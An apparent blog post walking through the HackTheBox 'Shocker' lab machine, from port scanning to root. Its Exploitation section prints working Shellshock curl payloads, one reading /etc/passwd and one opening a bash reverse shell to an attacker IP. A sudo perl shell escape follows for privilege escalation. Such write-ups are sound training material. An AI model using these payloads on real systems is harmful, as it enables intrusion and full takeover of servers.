---
layout: post
title:  "HackTheBox - Shocker"
author: erik
categories: [ HTB ]
image: https://user-images.githubusercontent.com/47476901/155027926-b71bb485-cab8-42b8-bff8-0a2bcf680799.png
beforetoc: ""
toc: false
tags: [ HTB, CVE, Linux ]
---

Linux machine easy level

# Table of Contents
1. [Enumeration](#enumeration)
2. [Explotation](#explotation)
3. [Privilege Escalation](#escalation)

---

## Enumeration: <a name="enumeration"></a>

**Ports:**
-  80 HTTP
-  2222 SSH

### Nmap

```bash
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
```

### Web Content

![WebImage](https://user-images.githubusercontent.com/47476901/123010578-c787b380-d3b6-11eb-8466-9993c71af83a.png)

Fuzzing with dirbuster we found a script in "/cgi-bin/user.sh"

![cgi-bin](https://user-images.githubusercontent.com/47476901/123010587-cbb3d100-d3b6-11eb-8473-e981b30a6ed3.png)

We found a very common vulnerability, which consists of exploiting the script in /cgi-bin/, known as "**shellshock**".
The text in the web image makes more sense.

I found this page that helps us to exploit it.

- <a href="https://www.surevine.com/shellshocked-a-quick-demo-of-how-easy-it-is-to-exploit" target="_blank">Exploit Here</a>

## Explotation: <a name="explotation"></a>

Use the payload that worked:

```bash
curl http://10.10.10.56/cgi-bin/user.sh -H "custom:() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd"
```

![TestRCE](https://user-images.githubusercontent.com/47476901/123010602-d2424880-d3b6-11eb-9489-3799f074775e.png)

Since the payload works for us, we took the opportunity to give ourselves a shell:

```bash
curl http://10.10.10.56/cgi-bin/user.sh -H "custom:() { ignored; }; echo Content-Type: text/html; echo ; /bin/bash -i >& /dev/tcp/10.10.14.12/1234 0>&1" 
```

And we listen in that port:

![RevShell](https://user-images.githubusercontent.com/47476901/123010615-d79f9300-d3b6-11eb-997d-138764b6f72c.png)

## Privilege Escalation: <a name="escalation"></a>

In the shelly directory we find the user flag:

![user txt](https://user-images.githubusercontent.com/47476901/123010625-dc644700-d3b6-11eb-9934-82663b902318.png)

The first thing we usually do is to look at what binaries we can run as root.
We found a command that can be run as root and we don't need a password for it.

![sudoers](https://user-images.githubusercontent.com/47476901/123010635-dff7ce00-d3b6-11eb-9e0e-7f6c608616e5.png)

Look at <a href="https://gtfobins.github.io/" target="_blank">gtfobins</a> so we can take advantage of it for scaling.

![gtfobins](https://user-images.githubusercontent.com/47476901/123010639-e38b5500-d3b6-11eb-9874-e34b9a2a6bd9.png)

Proceed to exploit it:

```bash
sudo perl -e 'exec "/bin/sh";'
```
![GettingRoot](https://user-images.githubusercontent.com/47476901/123010645-e8500900-d3b6-11eb-95a6-fab08f1b69c6.png)

We are root

![root txt](https://user-images.githubusercontent.com/47476901/123010650-ec7c2680-d3b6-11eb-8035-5f510a93a872.png)

**Machine Completed**
